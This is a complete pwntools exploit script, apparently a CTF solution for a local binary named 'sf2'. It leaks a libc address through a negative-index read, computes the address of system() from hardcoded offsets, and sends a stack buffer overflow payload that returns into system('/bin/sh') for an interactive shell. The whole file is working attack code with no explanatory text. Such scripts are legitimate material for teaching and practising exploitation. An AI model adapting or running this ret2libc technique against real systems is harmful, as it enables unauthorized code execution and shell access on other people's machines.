from pwn import*
p=process('./sf2')
# gadget
bss = 0x804A060

# definition
def create(idx,data):
	p.sendlineafter('> ','1')
	p.sendline(str(idx))
	p.sendline(data)
	
def show(idx):
	p.sendlineafter('> ','2')
	p.sendline(str(idx))
	

def comment(data):
	p.sendlineafter('> ','3')
	p.sendlineafter('Comment : ',data)

# libc leak
create(0,'/bin/sh')
show(-4)

p.recvuntil('Your data : ')
libc_printf = u32(p.recv(4))
libc_base = libc_printf - 0x49670
libc_system = libc_base + 0x3ada0
print 'libc_system = '+hex(libc_system)

# exploit
pay =''
pay += 'a'*0x1C		# buf
pay += 'b'*0x4		# sfp
pay += p32(libc_system)	# ret
pay += 'c'*0x4		# dummy
pay += p32(bss)		# factor


comment(pay)


p.interactive()
